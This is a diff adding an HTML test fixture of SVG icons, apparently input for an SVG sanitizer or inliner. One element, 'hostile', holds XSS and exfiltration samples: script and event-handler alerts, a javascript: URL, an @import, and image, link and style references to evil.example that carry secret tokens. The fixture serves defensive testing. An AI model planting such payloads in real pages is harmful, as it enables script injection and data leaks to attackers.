@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>SVG</title>
+<style>
+body { margin: 0; padding: 16px; font: 14px Arial, sans-serif; color: rgb(10, 20, 30); }
+.ico { width: 24px; height: 24px; color: rgb(200, 0, 0); }
+.ico path { fill: currentColor; }
+.classy { fill: rgb(0, 128, 0); }
+svg { display: block; margin-bottom: 8px; }
+</style>
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute"><defs>
+  <symbol id="sym" viewBox="0 0 24 24"><path d="M2 2h20v20H2z"/></symbol>
+  <linearGradient id="grad"><stop offset="0" stop-color="currentColor"/><stop offset="1" stop-color="rgb(0,0,255)"/></linearGradient>
+</defs></svg>
+<svg class="ico" id="plain" viewBox="0 0 24 24"><path d="M3 3h18v18H3z"/></svg>
+<svg class="ico" id="used" viewBox="0 0 24 24"><use href="#sym" fill="currentColor"/></svg>
+<svg width="24" height="24" viewBox="0 0 24 24" id="classy"><rect class="classy" width="24" height="24" opacity="0.5"/></svg>
+<svg width="24" height="24" viewBox="0 0 24 24" id="grad-user"><rect width="24" height="24" fill="url(#grad)"/></svg>
+<svg width="24" height="24" viewBox="0 0 24 24" id="hostile" onload="alert(1)">
+  <script>alert(1)</script>
+  <style>@import url(http://evil.example/x.css); rect.never { fill: red }</style>
+  <rect width="24" height="24" onclick="alert(2)" fill="url(http://evil.example/p.svg#a)"/>
+  <a href="https://evil.example/click?token=SECRET-TOKEN"><circle cx="12" cy="12" r="6"/></a>
+  <image href="http://evil.example/img.png?k=SECRET-QUERY" width="4" height="4"/>
+  <image xlink:href="https://evil.example/other.png" width="4" height="4" xmlns:xlink="http://www.w3.org/1999/xlink"/>
+  <use href="http://evil.example/sprite.svg#icon"/>
+  <set attributeName="href" to="javascript:alert(3)"/>
+  <foreignObject width="24" height="24"><input value="TYPED-SECRET"></foreignObject>
+  <path id="p2" d="M0 0h4v4H0z" style="fill: rgb(1, 2, 3); stroke: url(http://evil.example/s.svg#x)"/>
+</svg>
+<svg width="24" height="24" viewBox="0 0 24 24" id="loop"><defs><g id="a"><use href="#b"/></g><g id="b"><use href="#a"/></g></defs><use href="#a"/><rect width="4" height="4"/></svg>
+</body>
+</html>
